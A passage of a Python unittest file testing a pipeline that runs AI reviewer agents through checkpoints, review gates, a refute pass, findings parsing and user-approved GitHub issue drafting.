    def test_the_last_run_sweeps_verifies_and_ticks(self):
        self.planned()
        self.next("--plan-ok")
        self.write_plan(a="x", b="x", c="x")
        self.agent_ran("developer", "run: build unit: SCENARIO-01 feature: demo", "## Phase report\nNext: Step 6")

        _, out = self.next()

        self.assertIn("Sweep + Verify", out)
        self.assertIn("last run", Path(out.split("Brief: ")[1].split(" — ")[0]).read_text())

    def built(self, test_file=True):
        """SCENARIO-01 planned, built and ticked, with a Go test file in its diff."""
        self.planned()
        self.next("--plan-ok")
        self.write_plan(a="x", b="x", c="x", d="x")
        if test_file:
            (self.root / "go").mkdir()
            (self.root / "go" / "a_test.go").write_text("package a\n")
        self.tick("SCENARIO-01")
        self.agent_ran("developer", "run: build unit: SCENARIO-01 feature: demo", "## Phase report\ndone")

    @mock.patch.object(pl, "CHECKPOINT", True)
    def test_a_ticked_scenario_goes_to_its_checkpoint(self):
        self.built()

        _, out = self.next()

        self.assertIn("run: checkpoint unit: SCENARIO-01 feature: demo", out)
        self.assertIn("`pipeline:test-reviewer`", out)

    @mock.patch.object(pl, "CHECKPOINT", True)
    def test_a_clean_checkpoint_writes_its_file_and_metrics_row_and_moves_on(self):
        self.built()
        self.next()
        self.agent_ran("test-reviewer", "run: checkpoint unit: SCENARIO-01 feature: demo",
                       "[MINOR] go/a_test.go:1 — name is vague\n  Why: unclear")

        _, out = self.next()

        self.assertIn("MINOR", (pl.runs_of(self.spec_dir) / "CHECKPOINT-SCENARIO-01.md").read_text())
        self.assertIn("| SCENARIO-01 | large | 4 batches, 1 package (services/a) | code-first | 1 | n/a | 0/0/1/0 | no |",
                      (pl.runs_of(self.spec_dir) / "METRICS.md").read_text())
        self.assertIn("Found by pipeline:test-reviewer in the checkpoint of SCENARIO-01", pl.open_drafts(self.spec_dir)[0]["body"])
        self.assertIn("run: build unit: SCENARIO-02 feature: demo size: small", out)

    def test_with_the_checkpoint_off_a_ticked_scenario_is_done_and_the_next_one_starts(self):
        self.built()

        _, out = self.next()

        self.assertIn("the checkpoint is off", out)
        self.assertNotIn("run: checkpoint", out)
        self.assertIn("run: build unit: SCENARIO-02 feature: demo size: small", out)
        self.assertIn("| SCENARIO-01 | large | 4 batches, 1 package (services/a) | code-first | 1 | n/a | off | no |",
                      (pl.runs_of(self.spec_dir) / "METRICS.md").read_text())

    @mock.patch.object(pl, "CHECKPOINT", True)
    def test_a_blocking_checkpoint_gets_one_fix_pass_then_moves_on(self):
        self.built()
        self.next()
        self.agent_ran("test-reviewer", "run: checkpoint unit: SCENARIO-01 feature: demo",
                       "[MAJOR] go/a_test.go:1 — acceptance test cannot fail\n  Failure: always green")

        _, out = self.next()

        self.assertIn("run: checkpoint-fix unit: SCENARIO-01 feature: demo", out)
        self.agent_ran("developer", "run: checkpoint-fix unit: SCENARIO-01 feature: demo", "fixed")
        _, out = self.next()
        self.assertIn("SCENARIO-02", out)

    @mock.patch.object(pl, "CHECKPOINT", True)
    def test_a_scenario_with_nothing_to_review_records_an_empty_checkpoint(self):
        self.built(test_file=False)

        self.next()

        self.assertEqual(self.state()["scenarios"]["SCENARIO-01"]["checkpoint"], "0/0/0/0")

    def test_a_small_scenario_skips_the_architect_and_the_plan_review(self):
        self.tick("SCENARIO-01")

        _, out = self.next()

        self.assertIn("run: build unit: SCENARIO-02 feature: demo size: small", out)
        self.assertIn("write", out)

    def test_a_folded_scenario_gets_no_run(self):
        self.run_cli("fold", "demo", "SCENARIO-01", "SCENARIO-02")

        _, out = self.next()

        self.assertIn("SCENARIO-02", out)
        self.assertNotIn("unit: SCENARIO-01", out)

    def test_scenarios_ticked_before_the_cursor_existed_are_left_alone(self):
        self.tick("SCENARIO-01")
        self.tick("SCENARIO-02")
        (self.plugin_agents / "test-reviewer.md").unlink()

        code, out = self.next()

        self.assertEqual(code, 2)
        self.assertIn("REVIEWER DISCOVERY FAILED", out)


class KickoffTest(Feature):
    """A build does not begin until what the kickoff pause settles is written in the specification."""

    def respec(self, old, new):
        text = self.spec.read_text()
        self.assertIn(old, text)
        self.spec.write_text(text.replace(old, new))

    def test_a_specification_with_no_kickoff_decision_is_refused_and_told_what_is_missing(self):
        self.respec("- D-1 (2026-11-25)", "- D-2 (2026-11-25)")

        code, out = self.next()

        self.assertEqual(code, 2)
        self.assertIn("`## Decisions` has no `D-1 (YYYY-MM-DD)", out)
        self.assertIn("Do not fill these in for them", out)
        self.assertFalse((pl.runs_of(self.spec_dir) / pl.STATE_FILE).exists())

    def test_the_run_mode_is_the_users_to_choose(self):
        self.respec("**Run**: here\n", "**Run**: <here | unattended>\n")

        code, out = self.next()

        self.assertEqual(code, 2)
        self.assertIn("`**Run**: here` or `**Run**: unattended`", out)

    def test_a_placeholder_left_in_d1_is_not_a_confirmation(self):
        self.respec("- D-1 (2026-11-25): Understood as a demo feature for the tests", "- D-1 (2026-11-25): <what the user confirmed>")

        self.assertEqual(self.next()[0], 2)

    def test_a_spec_without_the_v4_marker_is_refused(self):
        self.respec("<!-- spec-check: v4 -->", "")

        code, out = self.next()

        self.assertEqual(code, 2)
        self.assertIn("no `<!-- spec-check: v4 -->` marker", out)

    def test_a_default_condition_the_pipeline_cannot_read_is_reported(self):
        _, problems = pl.conditions(self.root, ["gate_rounds <= 2", "happiness >= 9", "the code should be nice", "dev_runs_max <= 1.2.3"])

        self.assertIn("`happiness` is not a metric the pipeline can read", problems[0])
        self.assertEqual(sum("is not a pass condition" in p for p in problems), 2)

    def test_a_build_already_under_way_is_not_stopped_for_a_missing_kickoff(self):
        self.next()
        self.respec("- D-1 (2026-11-25)", "- D-2 (2026-11-25)")

        self.assertEqual(self.next("--drop-pending")[0], 0)

    def test_the_draft_names_the_defaults_and_every_metric(self):
        _, out = self.run_cli("evaluate", "--draft")

        self.assertTrue(all(c in out for c in pl.defaults(self.root)["pass_conditions"]))
        self.assertTrue(all(name in out for name in pl.EVAL_METRICS))
        self.assertEqual(pl.conditions(self.root)[1], [])

class GateFixture(Feature):
    def setUp(self):
        super().setUp()
        self.tick("SCENARIO-01")
        self.tick("SCENARIO-02")
        (self.root / "go").mkdir()
        (self.root / "go" / "a_test.go").write_text("package a\n")
        self.real_gate = pl.gate
        pl.gate = self.fake_gate
        self.problems = []
        pl.REFUTE_MAJORS = self.refute  # the refute pass has its own tests below

    refute = False

    def tearDown(self):
        pl.gate = self.real_gate
        pl.REFUTE_MAJORS = False
        super().tearDown()

    def fake_gate(self, root, slug, round_no, base, pre_fix, only, exclude):
        self.gate_args = {"round": round_no, "pre_fix": pre_fix, "only": only}
        agents = only.split(",") if only else ["test-reviewer", "correctness-reviewer"]
        return {"agents": agents, "skipped": {}, "tag": f"run: review unit: REVIEW-{round_no:02d} feature: demo",
                "sensitive": [], "mutation": "n/a", "spec_problems": self.problems, "go_production": False}

    def reviewed(self, round_no, **replies):
        for agent, text in replies.items():
            self.agent_ran(agent.replace("_", "-"), f"run: review unit: REVIEW-{round_no:02d} feature: demo", text)

class GateTest(GateFixture):
    def test_a_round_with_a_major_fails_and_asks_for_one_fix_pass(self):
        self.next()
        self.reviewed(1, test_reviewer="[MAJOR] go/a_test.go:1 — vacuous\n  Failure: never red",
                      correctness_reviewer="[MINOR] go/a_test.go:1 — also noted\n[NIT] go/b.go:2 — nit")

        _, out = self.next()

        review = (pl.runs_of(self.spec_dir) / "REVIEW-01.md").read_text()
        self.assertIn("### Verdict: FAIL", review)
        self.assertIn("**test-reviewer, correctness-reviewer**", review)
        self.assertIn("| 1 | test-reviewer, correctness-reviewer | 0/1/0/1 | n/a | FAIL |", (pl.runs_of(self.spec_dir) / "METRICS.md").read_text())
        self.assertIn("run: gate-fix unit: REVIEW-01 feature: demo", out)

    def test_a_spec_check_problem_fails_the_round(self):
        self.problems = ["demo SCENARIO-01: acceptance test failed"]
        self.next()
        self.reviewed(1, test_reviewer="clean", correctness_reviewer="clean")

        self.next()

        self.assertIn("### Verdict: FAIL", (pl.runs_of(self.spec_dir) / "REVIEW-01.md").read_text())

    def test_every_spec_check_problem_reaches_the_fix_pass(self):
        self.problems = ["demo SCENARIO-01: acceptance test failed", "demo SCENARIO-02: case 02.2 uncovered"]
        self.next()
        self.reviewed(1, test_reviewer="clean", correctness_reviewer="clean")

        self.next()

        review = (pl.runs_of(self.spec_dir) / "REVIEW-01.md").read_text()
        self.assertIn("SCENARIO-01: acceptance test failed", review)
        self.assertIn("SCENARIO-02: case 02.2 uncovered", review)

    def test_a_note_about_the_hunt_lands_on_the_rounds_metrics_row(self):
        self.next()
        self.reviewed(1, test_reviewer="clean", correctness_reviewer="clean")

        self.next("--note", "security-hunt skipped (no sensitive path)")

        self.assertIn("| 1 | test-reviewer, correctness-reviewer; security-hunt skipped (no sensitive path) | 0/0/0/0 |",
                      (pl.runs_of(self.spec_dir) / "METRICS.md").read_text())

    def test_the_first_gate_refuses_when_no_reviewer_has_anything_to_review(self):
        pl.gate = lambda *a: {"agents": [], "skipped": {}, "tag": "t", "sensitive": [], "mutation": "n/a",
                              "spec_problems": [], "go_production": False}

        code, out = self.next()

        self.assertEqual(code, 2)
        self.assertIn("--base", out)

    def test_the_token_ledger_replaces_the_placeholder_section(self):
        metrics = pl.runs_of(self.spec_dir) / "METRICS.md"
        metrics.write_text(metrics.read_text() + "\n## Tokens\n<placeholder>\n\n## Escaped defects\n| Found |\n")
        self.passed()

        text = metrics.read_text()
        self.assertIn("## Evaluation", text)
        self.assertIn("| gate_rounds | <= 2 | 1 | pass |", text)
        self.assertEqual(text.count("## Tokens"), 1)
        self.assertNotIn("<placeholder>", text)
        self.assertLess(text.index("## Tokens"), text.index("## Escaped defects"))

    def test_an_outside_finding_joins_the_round(self):
        self.next()
        self.reviewed(1, test_reviewer="clean", correctness_reviewer="clean")

        self.next("--finding", "[BLOCKER] go/a.go:9 — race on the session map")

        self.assertIn("race on the session map", (pl.runs_of(self.spec_dir) / "REVIEW-01.md").read_text())

    def test_a_re_gate_waits_for_the_reviewers_to_be_chosen_and_diffs_the_fix_only(self):
        self.next()
        self.reviewed(1, test_reviewer="[MAJOR] go/a_test.go:1 — vacuous", correctness_reviewer="clean")
        self.next()
        self.agent_ran("developer", "run: gate-fix unit: REVIEW-01 feature: demo", "fixed")

        _, out = self.next()

        self.assertIn("next --only test-reviewer", out)
        self.next("--only", "test-reviewer")
        self.assertEqual(self.gate_args["round"], 2)
        self.assertEqual(self.gate_args["only"], "test-reviewer")
        self.assertIsNotNone(self.gate_args["pre_fix"])

    def test_minors_alone_end_the_gate_and_each_becomes_an_issue_draft(self):
        self.next()
        self.reviewed(1, test_reviewer="[MINOR] go/a_test.go:1 — vague name\n[NIT] go/a_test.go:2 — spacing",
                      correctness_reviewer="clean")

        _, out = self.next()

        self.assertIn("PASS WITH FOLLOW-UPS", (pl.runs_of(self.spec_dir) / "REVIEW-01.md").read_text())
        drafts = pl.open_drafts(self.spec_dir)
        self.assertEqual([d["title"] for d in drafts], ["go/a_test.go:1 — vague name", "go/a_test.go:2 — spacing"])
        self.assertEqual(drafts[0]["labels"], ["debt"])
        self.assertIn("Found by test-reviewer in REVIEW-01 of `demo` (MINOR).", drafts[0]["body"])
        self.assertIn("`pipeline:pipeline-reviewer`", out)  # no product pass after the gate: on to the retro
        self.assertNotIn("product-vision", out)
        self.assertNotIn("gate-fix", out)

    def passed(self):
        self.next()
        self.reviewed(1, test_reviewer="clean", correctness_reviewer="clean")
        return self.next()[1]

    def test_a_passed_gate_is_scored_and_goes_to_the_retro_and_then_done(self):
        out = self.passed()

        self.assertIn("stage: score", out)
        self.assertIn("`pipeline:pipeline-reviewer`", out)
        self.assertIn("retro demo", out)
        self.agent_ran("pipeline-reviewer", "run: final unit: feature feature: demo", "# Retro: demo")
        code, out = self.next()
        self.assertEqual(code, 3)
        retro = pl.retro_file(self.spec_dir).read_text()
        self.assertTrue(retro.startswith("# Retro: demo\n\n## Metrics\n"))
        self.assertIn("\n### Final gate\n", retro)  # the ledger's sections, one level down

    def failed_twice(self):
        self.next()
        self.reviewed(1, test_reviewer="[MAJOR] go/a_test.go:1 — vacuous", correctness_reviewer="clean")
        self.next()
        self.agent_ran("developer", "run: gate-fix unit: REVIEW-01 feature: demo", "fixed")
        self.next()
        self.next("--only", "test-reviewer")
        self.reviewed(2, test_reviewer="[MAJOR] go/a_test.go:1 — still vacuous")

    def test_a_round_that_fails_after_the_one_fix_pass_stops_and_drafts_what_is_open(self):
        self.failed_twice()

        code, out = self.next()

        self.assertEqual(code, 2)
        self.assertIn("no third round", out)
        self.assertEqual([d["title"] for d in pl.open_drafts(self.spec_dir)], ["go/a_test.go:1 — still vacuous"])

    def test_asking_again_after_the_cap_drafts_nothing_twice(self):
        self.failed_twice()
        self.next()

        code, _ = self.next()

        self.assertEqual(code, 2)
        self.assertEqual(len(pl.open_drafts(self.spec_dir)), 1)

    def test_accepting_the_round_open_goes_on_to_the_retro(self):
        self.failed_twice()
        self.next()

        code, out = self.next("--accept-open")

        self.assertEqual(code, 0)
        self.assertIn("retro demo", out)
        self.assertNotIn("gate-fix", out)


class RefuteTest(GateFixture):
    """One attempt to prove a round's reviewer MAJORs wrong, before the round is written."""

    refute = True
    TAG = "run: refute unit: REVIEW-01 feature: demo"

    def round_with(self, **replies):
        self.next()
        self.reviewed(1, **replies)
        return self.next()

    def test_a_major_is_held_and_put_to_the_refuter_in_the_reviewers_words(self):
        _, out = self.round_with(test_reviewer="[MAJOR] go/a_test.go:1 — vacuous\n  Failure: never red",
                                 correctness_reviewer="[MINOR] go/b.go:2 — noted")

        self.assertFalse((pl.runs_of(self.spec_dir) / "REVIEW-01.md").exists())
        self.assertIn(self.TAG, out)
        brief = Path(re.search(r"Brief: (\S+)", out).group(1)).read_text()
        self.assertIn("## M1 — raised by test-reviewer", brief)
        self.assertIn("Failure: never red", brief)
        self.assertNotIn("noted", brief)

    def test_a_refuted_major_is_written_as_a_minor_and_the_round_passes(self):
        self.round_with(test_reviewer="[MAJOR] go/a_test.go:1 — vacuous", correctness_reviewer="clean")
        self.agent_ran("refuter", self.TAG, "M1: REFUTED — go/a_test.go:14 the sibling test reddens when the guard goes")

        _, out = self.next()

        review = (pl.runs_of(self.spec_dir) / "REVIEW-01.md").read_text()
        self.assertIn("### Verdict: PASS WITH FOLLOW-UPS", review)
        self.assertIn("[MINOR] go/a_test.go:1 — vacuous", review)
        self.assertIn("Refuted (was MAJOR): go/a_test.go:14 the sibling test", review)
        self.assertIn("refute pass: 1 of 1 MAJORs refuted (test-reviewer 1/1) | 0/0/1/0 |",
                      (pl.runs_of(self.spec_dir) / "METRICS.md").read_text())
        self.assertIn("run: final", out)

    def test_only_the_findings_that_survive_reach_the_fix_pass(self):
        self.round_with(test_reviewer="[MAJOR] go/a_test.go:1 — vacuous\n[MAJOR] go/a_test.go:9 — no fault arm",
                        correctness_reviewer="[MAJOR] go/b.go:2 — error dropped")
        self.agent_ran("refuter", self.TAG, "M1: STANDS — no test reddens\n**M2**: REFUTED — go/a_test.go:40 covers it\n"
                                            "M3: STANDS — the error is discarded")

        _, out = self.next()

        review = (pl.runs_of(self.spec_dir) / "REVIEW-01.md").read_text()
        self.assertIn("### Verdict: FAIL", review)
        self.assertEqual(review.count("[MAJOR]"), 2)
        self.assertIn("refute pass: 1 of 3 MAJORs refuted (correctness-reviewer 0/1, test-reviewer 1/2)",
                      (pl.runs_of(self.spec_dir) / "METRICS.md").read_text())
        self.assertIn("run: gate-fix unit: REVIEW-01", out)

    def test_a_refutal_with_no_line_behind_it_leaves_the_finding_standing(self):
        self.round_with(test_reviewer="[MAJOR] go/a_test.go:1 — vacuous", correctness_reviewer="clean")
        self.agent_ran("refuter", self.TAG, "M1: REFUTED — this seems unlikely to matter")

        self.next()

        self.assertIn("### Verdict: FAIL", (pl.runs_of(self.spec_dir) / "REVIEW-01.md").read_text())

    def test_a_finding_the_refuter_did_not_rule_on_stands(self):
        self.round_with(test_reviewer="[MAJOR] go/a_test.go:1 — vacuous", correctness_reviewer="clean")
        self.agent_ran("refuter", self.TAG, "I could not decide.")

        self.next()

        self.assertIn("### Verdict: FAIL", (pl.runs_of(self.spec_dir) / "REVIEW-01.md").read_text())

    def test_a_check_that_failed_is_not_put_to_the_refuter(self):
        self.problems = ["demo SCENARIO-01: acceptance test failed"]
        self.next()
        self.reviewed(1, test_reviewer="clean", correctness_reviewer="clean")

        _, out = self.next("--finding", "[MAJOR] go/a.go:9 — full gate red")

        self.assertNotIn("run: refute", out)
        self.assertIn("### Verdict: FAIL", (pl.runs_of(self.spec_dir) / "REVIEW-01.md").read_text())

    def test_a_dropped_refute_pass_is_asked_for_again_not_the_whole_round(self):
        self.round_with(test_reviewer="[MAJOR] go/a_test.go:1 — vacuous", correctness_reviewer="clean")

        _, out = self.next("--drop-pending")

        self.assertIn(self.TAG, out)
        self.assertNotIn("run: review", out)


class RealGateTest(Feature):
    """`gate()` itself, on a re-gate: which reviewers a fix brings back."""

    def setUp(self):
        super().setUp()
        agents = self.root / ".claude" / "agents"
        for name, globs in (("correctness-reviewer", '"go/services/**/*.go"'), ("arch-reviewer", '"go/services/**/*.go"'),
                            ("ts-correctness-reviewer", '"frontend/packages/**/*.ts"'),
                            ("refactor-advisor", '"go/services/**/*.go"')):
            (agents / name).mkdir()
            (agents / name / "Agent.md").write_text(f"---\nname: {name}\ntype: reviewer\ntriggers: [{globs}]\n---\n")
        self.pre = pl.snap(self.root)
        for path in ("go/services/core/authn/refresh.go", "go/services/core/todo/list.go",
                     "frontend/packages/auth/src/login.ts", "go/services/core/authn/refresh_test.go"):
            (self.root / path).parent.mkdir(parents=True, exist_ok=True)
            (self.root / path).write_text("x\n")

    def regate(self, only):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            return pl.gate(self.root, "demo", 2, "HEAD", self.pre, only, []), out.getvalue()

    def test_only_the_correctness_and_test_reviewers_run_on_the_gate(self):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            result = pl.gate(self.root, "demo", 1, "HEAD", None, None, [])

        self.assertEqual((True, False, False), tuple(n in result["agents"] for n in (
            "correctness-reviewer", "arch-reviewer", "refactor-advisor")))
        self.assertIn("arch-reviewer: off the gate", out.getvalue())
        self.assertIn("refactor-advisor: off the gate", out.getvalue())

    def test_the_correctness_reviewer_is_told_to_judge_against_the_spec(self):
        with contextlib.redirect_stdout(io.StringIO()):
            pl.gate(self.root, "demo", 1, "HEAD", None, None, [])

        brief = next(Path(a["brief"]).read_text() for a in pl.ACTION["agents"] if a["agent"] == "correctness-reviewer")
        self.assertIn("judge the diff against the specification's", brief)

    def test_a_fix_to_a_security_sensitive_file_brings_back_its_correctness_reviewer(self):
        result, out = self.regate("pipeline:test-reviewer")

        self.assertEqual(sorted(result["agents"]), ["correctness-reviewer", "pipeline:test-reviewer", "ts-correctness-reviewer"])
        self.assertIn("arch-reviewer: off the gate", out)

    def test_the_forced_reviewer_is_scoped_to_the_sensitive_files_only(self):
        self.regate("pipeline:test-reviewer")

        brief = next(Path(a["brief"]).read_text() for a in pl.ACTION["agents"] if a["agent"] == "correctness-reviewer")
        self.assertIn("go/services/core/authn/refresh.go", brief)
        self.assertNotIn("go/services/core/todo/list.go", brief)

    def test_a_changed_test_that_asserts_only_absence_is_put_to_the_test_reviewer(self):
        (self.root / "go/services/core/todo/list_test.go").write_text(
            "package todo\n\nfunc Test_a_stranger_sees_nothing(t *testing.T) {\n\tassert.Empty(t, list(t, stranger))\n}\n")

        self.regate("pipeline:test-reviewer")

        brief = next(Path(a["brief"]).read_text() for a in pl.ACTION["agents"] if a["agent"] == "pipeline:test-reviewer")
        self.assertIn("## Absence-only tests — rule on each", brief)
        self.assertIn("`go/services/core/todo/list_test.go:3` `Test_a_stranger_sees_nothing`", brief)
        other = next(Path(a["brief"]).read_text() for a in pl.ACTION["agents"] if a["agent"] == "correctness-reviewer")
        self.assertNotIn("Absence-only", other)

    def test_a_lister_that_crashed_does_not_read_as_nothing_to_list(self):
        self.assertIn("absence-only FAILED", pl.absence_only(self.root, "no-such-ref", self.pre))

    def test_a_pipeline_change_merged_in_mid_feature_is_not_part_of_the_fix(self):
        agents = self.root / ".claude" / "agents"
        (agents / "pipeline-reviewer").mkdir()
        (agents / "pipeline-reviewer" / "Agent.md").write_text(
            '---\nname: pipeline-reviewer\ntype: reviewer\ntriggers: [".claude/**"]\n---\n')
        self.pre = pl.snap(self.root)
        (self.root / ".claude" / "runner.py").write_text("# merged from main\n")
        (self.root / "go/services/core/todo/list.go").write_text("y\n")

        result, out = self.regate("pipeline-reviewer,correctness-reviewer")

        self.assertEqual(result["agents"], ["correctness-reviewer"])
        self.assertIn("pipeline-reviewer: no files matched triggers", out)
        self.assertIn("files changed: 1\n", out)

    def test_lists_the_sensitive_paths_as_the_users_call(self):
        result, out = self.regate("pipeline:test-reviewer")

        self.assertEqual(result["sensitive"], ["frontend/packages/auth/src/login.ts", "go/services/core/authn/refresh.go"])
        self.assertIn("is the user's call, not a gate step", out)


class FindingsTest(unittest.TestCase):
    def test_reads_findings_with_their_following_lines(self):
        text = "intro\n- **[MAJOR]** `go/a.go:12` — wrong\n  Failure: x\n\n[NIT] b.ts:3 — nit\n## Verdict\nignored"

        found = pl.findings(text, "r")

        self.assertEqual([(f["sev"], f["file"], f["line"]) for f in found], [("MAJOR", "go/a.go", 12), ("NIT", "b.ts", 3)])
        self.assertEqual(found[0]["text"][1].strip(), "Failure: x")

    def test_reads_a_severity_tag_that_carries_a_remark_and_an_absolute_path(self):
        found = pl.findings("[MINOR — does not block] /Users/x/repo/.claude/worktrees/w/go/a.go:53 — unthrottled", "r")

        self.assertEqual([(f["sev"], f["file"], f["line"]) for f in found], [("MINOR", "go/a.go", 53)])

    def test_counts_a_finding_that_names_no_line(self):
        found = pl.findings("[BLOCKER] race between revoke and refresh\n  Failure: lost update", "race-gate")

        self.assertEqual(pl.counts(found), "1/0/0/0")

    def test_skips_a_prior_finding_quoted_as_closed(self):
        text = "- [MAJOR] a.go:10 — vacuous — closed: the test now reddens\n> [MAJOR] b.go:2 — quoted\n[MINOR] c.go:3 — new"

        found = pl.findings(text, "r")

        self.assertEqual([(f["sev"], f["file"]) for f in found], [("MINOR", "c.go")])

    def test_keeps_both_wordings_when_two_reviewers_raise_one_line(self):
        merged = pl.merge_findings(pl.findings("[MINOR] a.go:1 — smell", "one") + pl.findings("[MAJOR] a.go:1 — defect", "two"))

        self.assertEqual(merged[0]["text"], ["[MAJOR] a.go:1 — defect", "[MINOR] a.go:1 — smell"])

    def test_only_a_scenario_its_own_size_line_marks_large_gets_an_architect(self):
        spec = ("## Scenarios\n\n### SCENARIO-01 — a\n\nSize: large\n\n### SCENARIO-02 — b\n\nfollows SCENARIO-01 (large)\n"
                "Size: small\n\n### SCENARIO-03 — c\n\n| 03.1 | edge | a large file | ok |\n")

        self.assertFalse(pl.is_small(spec, "SCENARIO-01"))
        self.assertTrue(pl.is_small(spec, "SCENARIO-02"))
        self.assertTrue(pl.is_small(spec, "SCENARIO-03"))

    def test_merges_the_same_line_at_the_highest_severity(self):
        a = pl.findings("[MINOR] a.go:1 — smell", "one")
        b = pl.findings("[MAJOR] a.go:1 — defect", "two")

        merged = pl.merge_findings(a + b)

        self.assertEqual(len(merged), 1)
        self.assertEqual(merged[0]["sev"], "MAJOR")
        self.assertEqual(merged[0]["reviewers"], ["one", "two"])
        self.assertEqual(pl.counts(merged), "0/1/0/0")


class TagTest(Feature):
    def test_prints_a_tag_for_a_prompt_the_script_does_not_write(self):
        code, out = self.run_cli("tag", "scope", "demo")

        self.assertEqual(out.strip(), "run: scope unit: feature feature: demo")


class FileIssuesTest(unittest.TestCase):
    """Issue drafts reach GitHub only through `file-issues --yes`, the user's yes."""

    def setUp(self):
        self.root = Path(tempfile.mkdtemp())
        self.addCleanup(__import__("shutil").rmtree, self.root)
        self.spec_dir = pl.spec_folder(self.root, "demo")
        found = [{"sev": sev, "file": "", "line": 0, "reviewers": ["test-reviewer"], "text": [f"[{sev}] go/a.go:{n} — gap {n}"]}
                 for n, sev in ((1, "MINOR"), (2, "NIT"))]
        pl.draft_issues(self.spec_dir, "demo", found, "REVIEW-01")

    def file(self, yes, results):
        calls = []

        def fake(cmd, **_):
            calls.append(cmd)
            return results.pop(0)
        out = io.StringIO()
        with mock.patch.object(pl.subprocess, "run", side_effect=fake), contextlib.redirect_stdout(out), \
                contextlib.redirect_stderr(io.StringIO()):
            code = pl.file_issues(self.root, "demo", yes)
        return code, calls, out.getvalue()

    def test_without_yes_it_lists_the_drafts_and_creates_nothing(self):
        code, calls, out = self.file(False, [])

        self.assertEqual((code, calls), (0, []))
        self.assertIn("- [debt] go/a.go:1 — gap 1", out)

    def test_with_yes_each_draft_is_created_with_its_label_and_marked_filed(self):
        ok = [subprocess.CompletedProcess([], 0, f"https://github.com/o/r/issues/{n}\n", "") for n in (7, 8)]

        code, calls, _ = self.file(True, ok)

        self.assertEqual(code, 0)
        self.assertEqual(calls[0][:5], ["gh", "issue", "create", "--title", "go/a.go:1 — gap 1"])
        self.assertEqual(calls[0][-2:], ["--label", "debt"])
        self.assertEqual(pl.open_drafts(self.spec_dir), [])
        self.assertIn("## [x] go/a.go:2 — gap 2 — https://github.com/o/r/issues/8", (pl.runs_of(self.spec_dir) / pl.ISSUES_FILE).read_text())

    def test_a_failure_part_way_leaves_the_filed_one_marked_and_the_rest_open(self):
        results = [subprocess.CompletedProcess([], 0, "https://github.com/o/r/issues/7\n", ""),
                   subprocess.CompletedProcess([], 1, "", "label not found")]

        code, _, _ = self.file(True, results)

        self.assertEqual(code, 1)
        self.assertEqual([d["title"] for d in pl.open_drafts(self.spec_dir)], ["go/a.go:2 — gap 2"])


if __name__ == "__main__":
    unittest.main()
